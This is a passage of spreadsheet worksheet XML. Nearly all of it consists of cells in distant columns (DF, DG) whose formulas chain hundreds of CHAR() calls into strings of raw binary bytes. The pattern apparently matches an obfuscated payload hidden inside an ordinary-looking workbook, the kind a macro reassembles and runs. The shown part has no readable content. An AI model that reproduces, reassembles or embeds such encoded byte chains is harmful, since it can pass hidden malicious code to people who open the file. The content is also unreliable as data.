AR(50)&amp;CHAR(22)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(14)&amp;CHAR(196)&amp;CHAR(9)&amp;CHAR(200)&amp;CHAR(197)&amp;CHAR(193)&amp;CHAR(36)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(210)&amp;CHAR(204)&amp;CHAR(15)&amp;CHAR(57)&amp;CHAR(245)&amp;CHAR(202)&amp;CHAR(196)&amp;CHAR(25)&amp;CHAR(2)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(200)&amp;CHAR(200)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(208)&amp;CHAR(193)&amp;CHAR(12)&amp;CHAR(49)&amp;CHAR(243)&amp;CHAR(54)&amp;CHAR(243)&amp;CHAR(196)&amp;CHAR(199)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(102)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(6)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(141)&amp;CHAR(107)&amp;CHAR(55)&amp;CHAR(45)&amp;CHAR(139)&amp;CHAR(72)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(62)&amp;CHAR(207)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(139)&amp;CHAR(106)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(16)&amp;CHAR(135)&amp;CHAR(73)&amp;CHAR(134)&amp;CHAR(10)&amp;CHAR(63)&amp;CHAR(64)&amp;CHAR(138)&amp;CHAR(53)&amp;CHAR(67)&amp;CHAR(130)&amp;CHAR(234)&amp;CHAR(14)&amp;CHAR(117)&amp;CHAR(248)&amp;CHAR(142)&amp;CHAR(103)&amp;CHAR(33)&amp;CHAR(61)&amp;CHAR(138)&amp;CHAR(200)&amp;CHAR(111)&amp;CHAR(22)&amp;CHAR(81)&amp;CHAR(60)&amp;CHAR(213)&amp;CHAR(30)&amp;CHAR(64)&amp;CHAR(201)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(123)&amp;CHAR(27)&amp;CHAR(136)&amp;CHAR(123)&amp;CHAR(55)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(246)&amp;CHAR(46)&amp;CHAR(252)&amp;CHAR(130)&amp;CHAR(236)&amp;CHAR(140)&amp;CHAR(3)&amp;CHAR(36)&amp;CHAR(53)&amp;CHAR(4)&amp;CHAR(66)&amp;CHAR(129)&amp;CHAR(231)&amp;CHAR(12)&amp;CHAR(115)&amp;CHAR(242)&amp;CHAR(136)&amp;CHAR(103)&amp;CHAR(45)&amp;CHAR(54)&amp;CHAR(61)&amp;CHAR(221)&amp;CHAR(7)&amp;CHAR(219)&amp;CHAR(141)&amp;CHAR(67)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(123)&amp;CHAR(12)&amp;CHAR(79)&amp;CHAR(172)&amp;CHAR(6)&amp;CHAR(40)&amp;CHAR(150)&amp;CHAR(202)&amp;CHAR(120)&amp;CHAR(249)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(33)&amp;CHAR(37)&amp;CHAR(132)&amp;CHAR(208)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(59)&amp;CHAR(248)&amp;CHAR(250)&amp;CHAR(238)&amp;CHAR(88)&amp;CHAR(95)&amp;CHAR(95)&amp;CHAR(80)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(17)&amp;CHAR(196)&amp;CHAR(152)&amp;CHAR(83)&amp;CHAR(46)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(45)&amp;CHAR(1)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(227)&amp;CHAR(128)&amp;CHAR(208)&amp;CHAR(112)&amp;CHAR(17)&amp;CHAR(93)&amp;CHAR(134)&amp;CHAR(122)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(32)&amp;CHAR(241)&amp;CHAR(136)&amp;CHAR(26)&amp;CHAR(59)&amp;CHAR(140)&amp;CHAR(12)&amp;CHAR(64)&amp;CHAR(140)</f>
        <v>_x0003_&amp;ã]‡H"1‹m7&gt;Œúˆw!_x001D_2Ë £¬¢Že#)‰_x000F_‹3A‹_x0007_F‰ü_x0001_uúŽr#3ŽF _x001E_q"_x001F_ˆG-_x0016_ÑH 2_x0016__x000F__x000C__x000C__x000E_Ä	ÈÅÁ$1øÒÌ_x000F_9õÊÄ_x0019__x0002_Å_x0006_ÈÈÀ_x0002_ÐÁ_x000C_1ó6óÄÇ_x0003_„f!5_x0006_|Òk7-‹H&amp;_x001E_&gt;ÏŽw/)‹j(_x001C_‹B+_x0010_‡I†
?@Š5C‚ê_x000E_uøŽg!=ŠÈo_x0016_Q&lt;Õ_x001E_@É‡Â{_x001B_ˆ{7_x0013_ö.ü‚ìŒ_x0003_$5_x0004_Bç_x000C_sòˆg-6=Ý_x0007_ÛC(_x001C_
_x000B_{_x000C_O¬_x0006_(–ÊxùŽO!%„Ð
ƒ;øúîX__P†Æ_x0011_Ä˜S.	ŽC-_x0001_PŒã€Ðp_x0011_]†z#_x0013_ ñˆ_x001A_;Œ_x000C_@Œ</v>
      </c>
      <c r="DG102" t="str">
        <f>CHAR(140)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(138)&amp;CHAR(239)&amp;CHAR(84)</f>
        <v>ŒxŸ_x001D_7Ÿ^ŠïT</v>
      </c>
    </row>
    <row r="103" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF103" t="str">
        <f>CHAR(230)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(254)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(199)&amp;CHAR(140)&amp;CHAR(101)&amp;CHAR(38)&amp;CHAR(9)&amp;CHAR(152)&amp;CHAR(70)&amp;CHAR(35)&amp;CHAR(6)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(121)&amp;CHAR(45)&amp;CHAR(9)&amp;CHAR(241)&amp;CHAR(175)&amp;CHAR(141)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(13)&amp;CHAR(78)&amp;CHAR(196)&amp;CHAR(33)&amp;CHAR(34)&amp;CHAR(43)&amp;CHAR(100)&amp;CHAR(110)&amp;CHAR(113)&amp;CHAR(98)&amp;CHAR(97)&amp;CHAR(105)&amp;CHAR(107)&amp;CHAR(113)&amp;CHAR(108)&amp;CHAR(113)&amp;CHAR(108)&amp;CHAR(37)&amp;CHAR(60)&amp;CHAR(39)&amp;CHAR(117)&amp;CHAR(112)&amp;CHAR(108)&amp;CHAR(103)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(60)&amp;CHAR(66)</f>
        <v>æ_x000D_xþUPÇŒe&amp;	˜F#_x0006_R€y-	ñ¯M#_x000D_NÄ!"+dnqbaikqlql%&lt;'uplgvc&lt;B</v>
      </c>
      <c r="DG103" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(86)&amp;CHAR(71)&amp;CHAR(146)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(20)</f>
        <v>Ÿ_x001D_RŸVG’4_x0014__x0014_</v>
      </c>
    </row>
    <row r="104" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DF104" t="s">
        <v>66</v>
      </c>
      <c r="DG104" t="str">
        <f>CHAR(173)&amp;CHAR(135)&amp;CHAR(157)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(115)&amp;CHAR(26)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(215)</f>
        <v>­‡_x0003_
s_x001A_þQ×</v>
      </c>
    </row>
    <row r="105" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG105" t="str">
        <f>CHAR(213)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(155)&amp;CHAR(56)&amp;CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õã‚÷›8z×Õ†</v>
      </c>
    </row>
    <row r="106" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG106" t="str">
        <f>CHAR(130)&amp;CHAR(255)&amp;CHAR(95)&amp;CHAR(117)&amp;CHAR(26)&amp;CHAR(92)&amp;CHAR(213)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(124)</f>
        <v>‚ÿ_u_x001A_\ÕÎA|</v>
      </c>
    </row>
    <row r="107" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG107" t="str">
        <f>CHAR(250)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(219)&amp;CHAR(240)&amp;CHAR(174)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(85)</f>
        <v>úUÙÛð®Ê|ŸU</v>
      </c>
    </row>
    <row r="108" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG108" t="str">
        <f>CHAR(209)&amp;CHAR(22)&amp;CHAR(189)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(117)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(178)</f>
        <v>Ñ_x0016_½ÎAu`M_x0002_²</v>
      </c>
    </row>
    <row r="109" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG109" t="str">
        <f>CHAR(157)&amp;CHAR(13)&amp;CHAR(206)&amp;CHAR(89)&amp;CHAR(183)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(5)</f>
        <v>_x000D_ÎY·_x001D_R×_x0005_</v>
      </c>
    </row>
    <row r="110" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG110" t="str">
        <f>CHAR(10)&amp;CHAR(20)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)</f>
        <v xml:space="preserve">
_x0014_×–RŸ^†¯4</v>
      </c>
    </row>
    <row r="111" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG111" t="str">
        <f>CHAR(20)&amp;CHAR(9)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(28)&amp;CHAR(223)</f>
        <v>_x0014_	wÿÕ†Ê4_x001C_ß</v>
      </c>
    </row>
    <row r="112" spans="110:111" x14ac:dyDescent="0.45">
      <c r="DG112" t="str">
        <f>CHAR(34)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(198)&amp;CHAR(89)&amp;CHAR(183)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>"²_x000D_ÆY·_x001D_R×</v>
      </c>
    </row>
    <row r="113" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG113" t="str">
        <f>CHAR(157)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(20)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(91)&amp;CHAR(40)&amp;CHAR(133)&amp;CHAR(238)</f>
        <v>_x0005__x000B__x0014_×–[(…î</v>
      </c>
    </row>
    <row r="114" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG114" t="str">
        <f>CHAR(79)&amp;CHAR(188)&amp;CHAR(144)&amp;CHAR(152)&amp;CHAR(208)&amp;CHAR(212)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)</f>
        <v>O¼˜ÐÔÕ†¯4</v>
      </c>
    </row>
    <row r="115" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG115" t="str">
        <f>CHAR(20)&amp;CHAR(25)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(28)&amp;CHAR(221)</f>
        <v>_x0014__x0019_wÿÕ†Ê4_x001C_Ý</v>
      </c>
    </row>
    <row r="116" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG116" t="str">
        <f>CHAR(34)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(159)&amp;CHAR(120)&amp;CHAR(30)&amp;CHAR(92)</f>
        <v>"Ÿ^†‚÷Ÿx_x001E_\</v>
      </c>
    </row>
    <row r="117" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG117" t="str">
        <f>CHAR(209)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(84)&amp;CHAR(21)&amp;CHAR(254)</f>
        <v>Ñ£â|Ÿ_x001D__x001B_T_x0015_þ</v>
      </c>
    </row>
    <row r="118" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG118" t="str">
        <f>CHAR(130)&amp;CHAR(241)&amp;CHAR(138)&amp;CHAR(174)&amp;CHAR(81)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)</f>
        <v>‚ñŠ®Q×Õã‚÷</v>
      </c>
    </row>
    <row r="119" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG119" t="str">
        <f>CHAR(147)&amp;CHAR(56)&amp;CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(255)&amp;CHAR(94)&amp;CHAR(109)</f>
        <v>“8z×Õ†‚ÿ^m</v>
      </c>
    </row>
    <row r="120" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG120" t="str">
        <f>CHAR(26)&amp;CHAR(92)&amp;CHAR(220)&amp;CHAR(121)&amp;CHAR(218)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(18)&amp;CHAR(215)&amp;CHAR(150)</f>
        <v>_x001A_\ÜyÚù__x0012_×–</v>
      </c>
    </row>
    <row r="121" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG121" t="str">
        <f>CHAR(214)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(25)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(102)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(134)</f>
        <v>Ö†Ê_x0019_×–fòý†</v>
      </c>
    </row>
    <row r="122" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG122" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(148)&amp;CHAR(239)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(187)</f>
        <v>Ê|×œ”ïÔ†Ê»</v>
      </c>
    </row>
    <row r="123" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG123" t="str">
        <f>CHAR(153)&amp;CHAR(29)&amp;CHAR(92)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(64)&amp;CHAR(140)&amp;CHAR(116)&amp;CHAR(159)&amp;CHAR(120)</f>
        <v>™_x001D_\×Õ@ŒtŸx</v>
      </c>
    </row>
    <row r="124" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG124" t="str">
        <f>CHAR(30)&amp;CHAR(92)&amp;CHAR(209)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(86)</f>
        <v>_x001E_\Ñ£â|Ÿ_x001D__x001B_V</v>
      </c>
    </row>
    <row r="125" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG125" t="str">
        <f>CHAR(21)&amp;CHAR(190)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(167)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>_x0015_¾Ë|Ÿ§S×Õ†</v>
      </c>
    </row>
    <row r="126" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG126" t="str">
        <f>CHAR(172)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(178)&amp;CHAR(239)&amp;CHAR(84)</f>
        <v>¬ÅŽ_x001D_7Ÿ^²ïT</v>
      </c>
    </row>
    <row r="127" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG127" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(131)&amp;CHAR(174)&amp;CHAR(79)&amp;CHAR(188)&amp;CHAR(144)&amp;CHAR(153)</f>
        <v>Ÿ_x001D_R(ƒ®O¼™</v>
      </c>
    </row>
    <row r="128" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG128" t="str">
        <f>CHAR(168)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(41)&amp;CHAR(119)&amp;CHAR(255)</f>
        <v>¨ÕÕ†¯4_x0014_)wÿ</v>
      </c>
    </row>
    <row r="129" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG129" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(155)&amp;CHAR(218)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê4_x0016_›Ú×Õ†</v>
      </c>
    </row>
    <row r="130" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG130" t="str">
        <f>CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(9)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)</f>
        <v>¯4_x0014_	wÿÕ†Ê4</v>
      </c>
    </row>
    <row r="131" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG131" t="str">
        <f>CHAR(30)&amp;CHAR(223)&amp;CHAR(210)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(17)</f>
        <v>_x001E_ßÒ×Õ†¯4_x0014__x0011_</v>
      </c>
    </row>
    <row r="132" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG132" t="str">
        <f>CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(30)&amp;CHAR(220)&amp;CHAR(218)&amp;CHAR(215)</f>
        <v>wÿÕ†Ê4_x001E_ÜÚ×</v>
      </c>
    </row>
    <row r="133" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG133" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(150)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(92)&amp;CHAR(225)&amp;CHAR(163)</f>
        <v>Õ†‚÷–x_x001A_\á£</v>
      </c>
    </row>
    <row r="134" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG134" t="str">
        <f>CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(173)&amp;CHAR(129)&amp;CHAR(237)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(115)</f>
        <v>â|Ÿ_x001D_­í_x0003_
s</v>
      </c>
    </row>
    <row r="135" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG135" t="str">
        <f>CHAR(26)&amp;CHAR(174)&amp;CHAR(80)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(155)&amp;CHAR(56)</f>
        <v>_x001A_®P×Õã‚÷›8</v>
      </c>
    </row>
    <row r="136" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG136" t="str">
        <f>CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(211)&amp;CHAR(16)</f>
        <v>z×Õ†‚õXUÓ_x0010_</v>
      </c>
    </row>
    <row r="137" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG137" t="str">
        <f>CHAR(85)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(109)&amp;CHAR(159)&amp;CHAR(88)&amp;CHAR(179)</f>
        <v>U†Ê|×–mŸX³</v>
      </c>
    </row>
    <row r="138" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG138" t="str">
        <f>CHAR(206)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(16)&amp;CHAR(20)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(124)</f>
        <v>ÎxŸ_x001D__x001A__x0010__x0014_†Ä|</v>
      </c>
    </row>
    <row r="139" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG139" t="str">
        <f>CHAR(159)&amp;CHAR(238)&amp;CHAR(246)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(198)&amp;CHAR(89)&amp;CHAR(183)&amp;CHAR(29)</f>
        <v>Ÿîö²_x000D_ÆY·_x001D_</v>
      </c>
    </row>
    <row r="140" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG140" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(244)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)</f>
        <v>R×_x0007__x000B_ôŸ_x001D_RŸ</v>
      </c>
    </row>
    <row r="141" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG141" t="str">
        <f>CHAR(94)&amp;CHAR(143)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(33)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>^¯4_x0014_!wÿÕ†</v>
      </c>
    </row>
    <row r="142" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG142" t="str">
        <f>CHAR(202)&amp;CHAR(131)&amp;CHAR(200)&amp;CHAR(93)&amp;CHAR(215)&amp;CHAR(23)&amp;CHAR(218)&amp;CHAR(3)&amp;CHAR(172)&amp;CHAR(126)</f>
        <v>ÊƒÈ]×_x0017_Ú_x0003_¬~</v>
      </c>
    </row>
    <row r="143" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG143" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_7Ÿ^‚ïTŸ_x001D_</v>
      </c>
    </row>
    <row r="144" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG144" t="str">
        <f>CHAR(82)&amp;CHAR(159)&amp;CHAR(86)&amp;CHAR(70)&amp;CHAR(178)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(92)</f>
        <v>RŸVF²4_x0014__x001D__x001A_\</v>
      </c>
    </row>
    <row r="145" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG145" t="str">
        <f>CHAR(213)&amp;CHAR(227)&amp;CHAR(134)&amp;CHAR(247)&amp;CHAR(155)&amp;CHAR(56)&amp;CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õã†÷›8z×Õ†</v>
      </c>
    </row>
    <row r="146" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG146" t="str">
        <f>CHAR(131)&amp;CHAR(253)&amp;CHAR(95)&amp;CHAR(141)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)</f>
        <v>ƒý_R×Õã‚÷</v>
      </c>
    </row>
    <row r="147" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG147" t="str">
        <f>CHAR(139)&amp;CHAR(56)&amp;CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(253)&amp;CHAR(93)&amp;CHAR(149)</f>
        <v>‹8z×Õ†‚ý]•</v>
      </c>
    </row>
    <row r="148" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG148" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(110)&amp;CHAR(250)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(219)</f>
        <v>R×ÕÎAnúUÙÛ</v>
      </c>
    </row>
    <row r="149" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG149" t="str">
        <f>CHAR(240)&amp;CHAR(174)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(209)&amp;CHAR(22)&amp;CHAR(173)&amp;CHAR(206)</f>
        <v>ð®Ê|ŸUÑ_x0016_­Î</v>
      </c>
    </row>
    <row r="150" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG150" t="str">
        <f>CHAR(65)&amp;CHAR(117)&amp;CHAR(96)&amp;CHAR(141)&amp;CHAR(58)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(188)</f>
        <v>Au`:ÖÕ†O¼</v>
      </c>
    </row>
    <row r="151" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG151" t="str">
        <f>CHAR(144)&amp;CHAR(152)&amp;CHAR(64)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(25)</f>
        <v>˜@ÕÕ†¯4_x0014__x0019_</v>
      </c>
    </row>
    <row r="152" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG152" t="str">
        <f>CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(154)&amp;CHAR(141)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>wÿÕ†Ê4šR×</v>
      </c>
    </row>
    <row r="153" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG153" t="str">
        <f>CHAR(213)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(82)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(13)</f>
        <v>ÕÎA|×–R²_x000D_</v>
      </c>
    </row>
    <row r="154" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG154" t="str">
        <f>CHAR(222)&amp;CHAR(89)&amp;CHAR(183)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(7)&amp;CHAR(8)&amp;CHAR(228)</f>
        <v>ÞY·_x001D_R×_x0007__x0008_ä</v>
      </c>
    </row>
    <row r="155" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG155" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(198)&amp;CHAR(89)&amp;CHAR(183)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R²_x000D_ÆY·_x001D_</v>
      </c>
    </row>
    <row r="156" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG156" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(236)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)</f>
        <v>R×_x0007__x000B_ìŸ_x001D_RŸ</v>
      </c>
    </row>
    <row r="157" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG157" t="str">
        <f>CHAR(94)&amp;CHAR(143)&amp;CHAR(53)&amp;CHAR(236)&amp;CHAR(31)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(80)&amp;CHAR(70)</f>
        <v>^5ì_x001F__x001D_R×PF</v>
      </c>
    </row>
    <row r="158" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG158" t="str">
        <f>CHAR(197)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(28)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(120)</f>
        <v>ÅùS_x001C_R×°ÎAx</v>
      </c>
    </row>
    <row r="159" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG159" t="str">
        <f>CHAR(186)&amp;CHAR(53)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(206)&amp;CHAR(207)&amp;CHAR(228)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>º5R×ÕÎÏäŸ_x001D_</v>
      </c>
    </row>
    <row r="160" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG160" t="str">
        <f>CHAR(82)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(159)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(92)</f>
        <v>RŸ^†‚÷Ÿx_x001A_\</v>
      </c>
    </row>
